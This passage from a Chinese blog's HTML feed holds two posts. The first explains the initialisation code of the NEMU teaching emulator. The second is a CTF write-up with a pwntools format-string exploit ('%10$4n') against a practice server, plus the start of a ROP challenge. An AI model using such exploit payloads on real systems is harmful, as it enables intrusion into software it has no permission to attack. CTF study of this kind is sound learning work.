class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Monitor模块是为了方便地监控客户计算机的运行状态而引入的，它除了负责与GNU/Linux进行交互(例如读入客户程序)之外，还带有调试器的功能，为NEMU的调试提供了方便的途径。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_monitor</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 进行一些全局初始化 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 解析参数 */</span></span><br><span class="line">  parse_args(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 打开日志文件 */</span></span><br><span class="line">  init_log(log_file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将镜像加载到内存 */</span></span><br><span class="line">  <span class="keyword">long</span> img_size = load_img();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 执行依赖于ISA的初始化 */</span></span><br><span class="line">  init_isa();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 编译正则表达式 */</span></span><br><span class="line">  init_regex();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化watchpoint pool */</span></span><br><span class="line">  init_wp_pool();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化设备 */</span></span><br><span class="line">  init_device();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化差分测试 */</span></span><br><span class="line">  init_difftest(diff_so_file, img_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Display welcome message. */</span></span><br><span class="line">  welcome();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> is_batch_mode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="parse-args"><a href="#parse-args" class="headerlink" title="parse_args"></a>parse_args</h3><p>我们挨个解析函数，首先是解析参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *mainargs = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *log_file = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *diff_so_file = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *img_file = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> is_batch_mode = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">parse_args</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> o;</span><br><span class="line">  <span class="keyword">while</span> ( (o = getopt(argc, argv, <span class="string">&quot;-bl:d:a:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (o) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: is_batch_mode = <span class="literal">true</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>: mainargs = optarg; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>: log_file = optarg; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: diff_so_file = optarg; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (img_file != <span class="literal">NULL</span>) Log(<span class="string">&quot;too much argument &#x27;%s&#x27;, ignored&quot;</span>, optarg);</span><br><span class="line">                <span class="keyword">else</span> img_file = optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">                panic(<span class="string">&quot;Usage: %s [-b] [-l log_file] [img_file]&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>int getopt(int argc, char * const argv[ ], const char * optstring);</code></p><blockquote><p><strong>getopt作用：</strong>getopt用于分析参数。前两个参数就是main的参数。后面是个选项字符串：上文中的<code>-bl:d:a:</code>就是命令行中对应的<code>-b -l -d -a</code>，冒号表示这个选项后面必须带有参数，可以和选项连在一起写，也可以用空格隔开。两个冒号表示参数可选，就是可以带有参数也可以不带。</p><p>optarg指向额外参数</p><p><strong>return value：</strong>如果选项成功找到，返回选项字母。当所有命令行被解析，则getopt返回<code>-1</code>。如果存在未知的选项或缺失选项，getopt会返回<code>?</code>。</p></blockquote><p><code>panic</code></p><blockquote><p>当系统发现无法继续运行下去的故障时将调用它，会导致程序中止，然后由系统显示错误号。</p></blockquote><h3 id="init-log"><a href="#init-log" class="headerlink" title="init_log"></a>init_log</h3><p>然后是打开log</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FILE *log_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_log</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *log_file)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (log_file == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">  log_fp = fopen(log_file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  Assert(log_fp, <span class="string">&quot;Can not open &#x27;%s&#x27;&quot;</span>, log_file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打开log，失败报错。</span></span><br></pre></td></tr></table></figure><h3 id="load-img"><a href="#load-img" class="headerlink" title="load_img"></a>load_img</h3><p>将镜像文件读取到计算机内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们让monitor直接把一个有意义的客户程序读入到一个固定的内存位置IMAGE_START</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_START 0x100000</span></span><br><span class="line"><span class="comment">// convert the guest physical address in the guest program to host virtual address in NEMU</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> guest_to_host(p) ((void *)(pmem + (unsigned)p))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *mainargs = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *img_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">long</span> <span class="title">load_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> size;</span><br><span class="line">  <span class="keyword">if</span> (img_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    Log(<span class="string">&quot;No image is given. Use the default build-in image.&quot;</span>);</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">uint8_t</span> isa_default_img[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">long</span> isa_default_img_size;</span><br><span class="line">    size = isa_default_img_size;</span><br><span class="line">    <span class="built_in">memcpy</span>(guest_to_host(IMAGE_START), isa_default_img, size); <span class="comment">// 读取内置镜像到内存</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(img_file, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    Assert(fp, <span class="string">&quot;Can not open &#x27;%s&#x27;&quot;</span>, img_file); <span class="comment">// 失败的话报错</span></span><br><span class="line"></span><br><span class="line">    Log(<span class="string">&quot;The image is %s&quot;</span>, img_file);</span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    size = ftell(fp);</span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    ret = fread(guest_to_host(IMAGE_START), size, <span class="number">1</span>, fp); <span class="comment">// 读取镜像到内存</span></span><br><span class="line">    assert(ret == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mainargs</span></span><br><span class="line">    <span class="built_in">strcpy</span>(guest_to_host(<span class="number">0</span>), mainargs);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有镜像文件，就会根据你选择的ISA读取内置程序。本文选择的ISA是x86，下面阅读的代码也将是x86。</p><p><img src="https://i.loli.net/2021/06/22/C2sVqwNKQb78yLU.png" alt="image-20210622183442094"></p><p><strong>简单科普一下vscode快捷键，方便大家审阅代码。</strong></p><blockquote><p><code>f12</code> 转到定义<br><code>alt+方向键的←</code> 返回<br><code>alt+方向键的→</code> 前进</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> isa_default_img []  = &#123;</span><br><span class="line">  <span class="number">0xb8</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="comment">// 100000:  movl  $0x1234,%eax</span></span><br><span class="line">  <span class="number">0xb9</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>,        <span class="comment">// 100005:  movl  $0x100027,%ecx</span></span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x01</span>,                          <span class="comment">// 10000a:  movl  %eax,(%ecx)</span></span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xc7</span>, <span class="number">0x41</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,  <span class="comment">// 10000c:  movw  $0x1,0x4(%ecx)</span></span><br><span class="line">  <span class="number">0xbb</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="comment">// 100012:  movl  $0x2,%ebx</span></span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xc7</span>, <span class="number">0x84</span>, <span class="number">0x99</span>, <span class="number">0x00</span>, <span class="number">0xe0</span>,  <span class="comment">// 100017:  movw  $0x1,-0x2000(%ecx,%ebx,4)</span></span><br><span class="line">  <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="comment">// 100021:  movl  $0x0,%eax</span></span><br><span class="line">  <span class="number">0xd6</span>,                                <span class="comment">// 100026:  nemu_trap</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> isa_default_img_size = <span class="keyword">sizeof</span>(isa_default_img);</span><br></pre></td></tr></table></figure><p><strong>BIOS和计算机启动</strong></p><blockquote><p>内存是一种RAM，这意味着计算机在刚启动的时候，内存中的数据都是没有意义的。BIOS是一种ROM，它的内容不会因为断电而丢失。<br>所以在计算机启动的时候，首先会把控制权交给BIOS，BIOS在经过初始化工作后，再从磁盘将有意义的程序读入计算机内存中执行。</p><p>PA中对这些细节做了简化，采用约定的方式让CPU直接从约定的内存位置开始执行。</p></blockquote><h3 id="init-isa"><a href="#init-isa" class="headerlink" title="init_isa"></a>init_isa</h3><p>同样的，下一个函数初始化ISA，我们选择阅读x86代码(以下将不再提示，将会直接选择x86代码)</p><p><img src="https://i.loli.net/2021/06/22/zaTx59nQPSKGvoC.png" alt="image-20210622221849528"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_isa</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Test the implementation of the &#x27;CPU_state&#x27; structure. */</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">reg_test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">  reg_test();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Setup physical memory address space. */</span></span><br><span class="line">  register_pmem(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize this virtual computer system. */</span></span><br><span class="line">  restart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一个作业就是让我们实现寄存器结构体，reg_test函数会生成随机数据，对我们写的代码进行测试。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    word PC; <span class="comment">// Program Counter,</span></span><br><span class="line">    byte SP; <span class="comment">// Stack Pointer,</span></span><br><span class="line">    byte A, X, Y; <span class="comment">// Registers</span></span><br><span class="line">    byte P; <span class="comment">// Flag Register</span></span><br><span class="line">&#125; CPU_STATE;</span><br><span class="line">CPU_state cpu;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> R_EAX, R_ECX, R_EDX, R_EBX, R_ESP, R_EBP, R_ESI, R_EDI &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> reg_l(index) (cpu.gpr[check_reg_index(index)]._32)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reg_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  srand(time(<span class="number">0</span>)); <span class="comment">// 见下方解析</span></span><br><span class="line">  <span class="keyword">uint32_t</span> sample[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> pc_sample = rand();</span><br><span class="line">  cpu.pc = pc_sample;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = R_EAX; i &lt;= R_EDI; i ++) &#123;</span><br><span class="line">    sample[i] = rand();</span><br><span class="line">    reg_l(i) = sample[i];</span><br><span class="line">    assert(reg_w(i) == (sample[i] &amp; <span class="number">0xffff</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  assert(reg_b(R_AL) == (sample[R_EAX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_AH) == ((sample[R_EAX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_BL) == (sample[R_EBX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_BH) == ((sample[R_EBX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_CL) == (sample[R_ECX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_CH) == ((sample[R_ECX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_DL) == (sample[R_EDX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_DH) == ((sample[R_EDX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line"></span><br><span class="line">  assert(sample[R_EAX] == cpu.eax);</span><br><span class="line">  assert(sample[R_ECX] == cpu.ecx);</span><br><span class="line">  assert(sample[R_EDX] == cpu.edx);</span><br><span class="line">  assert(sample[R_EBX] == cpu.ebx);</span><br><span class="line">  assert(sample[R_ESP] == cpu.esp);</span><br><span class="line">  assert(sample[R_EBP] == cpu.ebp);</span><br><span class="line">  assert(sample[R_ESI] == cpu.esi);</span><br><span class="line">  assert(sample[R_EDI] == cpu.edi);</span><br><span class="line"></span><br><span class="line">  assert(pc_sample == cpu.pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果对随机不太了解，可以试一试下面的程序。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;time: %d\n&quot;</span>,time(<span class="number">0</span>)); <span class="comment">// time(0)返回当前时间戳，如果失败返回0。</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand1: %d\n&quot;</span>,rand());</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand2: %d\n&quot;</span>,rand());</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand3: %d\n&quot;</span>,rand());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// srand是随机数的初始化函数，通过参数生成伪随机数赋值给rand。</span></span><br></pre></td></tr></table></figure><blockquote><p>如果对enum不太了解，可以试试下面的程序</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> R_EAX, R_ECX, R_EDX, R_EBX, R_ESP, R_EBP, R_ESI, R_EDI &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,R_EAX);<span class="comment">// 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,R_ECX);<span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,R_EDX); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后是register_pmem函数，我们用它记录了物理内存的地址(NEMU默认为128MB的物理内存)。对于一些ISA来说，物理内存并不是从0开始的，例如mips32和riscv32的物理地址均从<code>0x80000000</code>开始。因此我们需要记录其物理内存的起始地址。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> IOMap pmem_map = &#123;</span><br><span class="line">  .name = <span class="string">&quot;pmem&quot;</span>,</span><br><span class="line">  .space = pmem,</span><br><span class="line">  .callback = <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">  <span class="comment">// we treat ioaddr_t as paddr_t here</span></span><br><span class="line">  <span class="keyword">paddr_t</span> low;</span><br><span class="line">  <span class="keyword">paddr_t</span> high;</span><br><span class="line">  <span class="keyword">uint8_t</span> *space;</span><br><span class="line">  <span class="keyword">io_callback_t</span> callback;</span><br><span class="line">&#125; IOMap;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMEM_SIZE (128 * 1024 * 1024)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_pmem</span><span class="params">(<span class="keyword">paddr_t</span> base)</span> </span>&#123;</span><br><span class="line">  pmem_map.low = base;</span><br><span class="line">  pmem_map.high = base + PMEM_SIZE - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  Log(<span class="string">&quot;Add &#x27;%s&#x27; at [0x%08x, 0x%08x]&quot;</span>, pmem_map.name, pmem_map.low, pmem_map.high);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后是restart函数，它用于初始化寄存器。设置pc指针到我们约定好的地方。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC_START (0x80000000u + IMAGE_START)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_START 0x100000</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">restart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Set the initial program counter. */</span></span><br><span class="line">  cpu.pc = PC_START;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="初始化后的内存布局"><a href="#初始化后的内存布局" class="headerlink" title="初始化后的内存布局"></a>初始化后的内存布局</h3><p>读入客户程序并对寄存器进行初始化后的内存的布局如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pmem:</span><br><span class="line"></span><br><span class="line">0             0x100000</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|                 |                  |</span><br><span class="line">|                 |    guest prog    |</span><br><span class="line">|                 |                  |</span><br><span class="line">-----------------------------------------------</span><br><span class="line">                  ^</span><br><span class="line">                  |</span><br><span class="line">                 pc</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年6月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[write up] buuoj学习</title>
      <link href="/2021/06/02/buuoj%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/06/02/buuoj%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/pwn">[第五空间2019 决赛]PWN5</a></p><p>代码核心逻辑：</p><p><img src="https://i.loli.net/2021/06/02/lIbpUGJfFH3Bnjx.png" alt="image-20210602182747720"></p><p>程序获得一个随机数，我们的密码需要和随机数相同。我们在21行把随机数覆盖成我们要输入的密码即可。</p><p>首先判断参数在栈的位置</p><p><img src="https://i.loli.net/2021/06/02/AiMc9seodSPKvpN.png" alt="image-20210602182613082"></p><p>随机数所在地址</p><p><img src="https://i.loli.net/2021/06/02/2PmitpcjC8qEnMJ.png" alt="image-20210602185856825"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29594</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your name:&#x27;</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0x0804C044</span>)+<span class="string">b&#x27;%10$4n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/get_started_3dsctf_2016">get_started_3dsctf_2016</a></p><p><img src="https://i.loli.net/2021/06/02/FGUxNA3aCP8QLXH.png" alt="image-20210602200359919"></p><p>这个程序没有<code>push ebp; mov ebp,esp</code>是用esp寻址的。所以返回距离只有0x38个字节。</p><p>本题核心逻辑如下，就是简单的ROP然后修改掉参数a1 a2的值。</p><p><img src="https://i.loli.net/2021/06/02/mhbkE7rKPMqz2oB.png" alt="image-20210602200927973"></p><p><img src="https://i.loli.net/2021/06/02/hutVjMRHkqzaD6I.png" alt="image-20210602201043807"></p><p><img src="https://i.loli.net/2021/06/02/PzhOAXbpsUwlDKa.png" alt="image-20210602200945808"></p><p>这里必须加上exit正常返回才能打通远程。</p><p><img src="https://i.loli.net/2021/06/02/mqw8x9IcMyHSOrX.png" alt="image-20210602203713530"></p><figure 